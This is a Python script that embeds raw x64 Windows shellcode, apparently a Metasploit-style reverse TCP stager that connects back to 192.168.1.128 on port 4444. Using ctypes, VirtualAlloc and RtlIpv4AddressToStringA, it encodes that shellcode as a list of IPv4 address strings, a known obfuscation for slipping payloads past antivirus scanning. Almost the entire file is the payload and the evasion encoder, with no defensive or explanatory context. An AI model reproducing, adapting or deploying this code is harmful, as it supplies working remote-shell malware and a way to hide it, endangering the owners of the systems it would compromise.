import ctypes

buf = b""
buf += b"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51"
buf += b"\x41\x50\x52\x48\x31\xd2\x51\x56\x65\x48\x8b\x52"
buf += b"\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x0f\xb7"
buf += b"\x4a\x4a\x48\x8b\x72\x50\x4d\x31\xc9\x48\x31\xc0"
buf += b"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
buf += b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b"
buf += b"\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
buf += b"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48"
buf += b"\x85\xc0\x74\x67\x48\x01\xd0\x44\x8b\x40\x20\x49"
buf += b"\x01\xd0\x50\x8b\x48\x18\xe3\x56\x48\xff\xc9\x41"
buf += b"\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
buf += b"\x41\xc1\xc9\x0d\xac\x41\x01\xc1\x38\xe0\x75\xf1"
buf += b"\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
buf += b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
buf += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58"
buf += b"\x41\x58\x48\x01\xd0\x5e\x59\x5a\x41\x58\x41\x59"
buf += b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
buf += b"\x59\x5a\x48\x8b\x12\xe9\x4b\xff\xff\xff\x5d\x49"
buf += b"\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49"
buf += b"\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5"
buf += b"\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x01\x80\x41\x54"
buf += b"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
buf += b"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41"
buf += b"\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x41\x5e\x50"
buf += b"\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89"
buf += b"\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf"
buf += b"\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
buf += b"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
buf += b"\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00"
buf += b"\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9"
buf += b"\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8"
buf += b"\x5f\xff\xd5\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20"
buf += b"\x5e\x89\xf6\x6a\x40\x41\x59\x68\x00\x10\x00\x00"
buf += b"\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba\x58\xa4"
buf += b"\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
buf += b"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba"
buf += b"\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58"
buf += b"\x41\x57\x59\x68\x00\x40\x00\x00\x41\x58\x6a\x00"
buf += b"\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5\x57\x59\x41"
buf += b"\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c"
buf += b"\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6"
buf += b"\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"
buf += b"\xf0\xb5\xa2\x56\xff\xd5"

paddings = len(buf) % 4
if paddings < 4:
    for i in range(4 - paddings):
        buf += b'\x00'
else:
    for i in range(paddings):
        buf += b'\x00'
group = int(len(buf) / 4)
buf_size = len(buf)

ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_int64

macmem = ctypes.windll.kernel32.VirtualAlloc(0, ctypes.c_int(group * 15), 0x3000, 0x40)
for i in range(group):
    bytes_a = buf[i * 4:4 + i * 4]
    ctypes.windll.Ntdll.RtlIpv4AddressToStringA(bytes_a, ctypes.c_int64(macmem + i * 15))

ipv4_list = []
for i in range(group):
    d = ctypes.string_at(macmem + i * 15, 15)
    ipv4_list.append(str(d, 'utf-8').replace('\x00', '').encode())
    # ipv4_list.append(d)
print(ipv4_list)
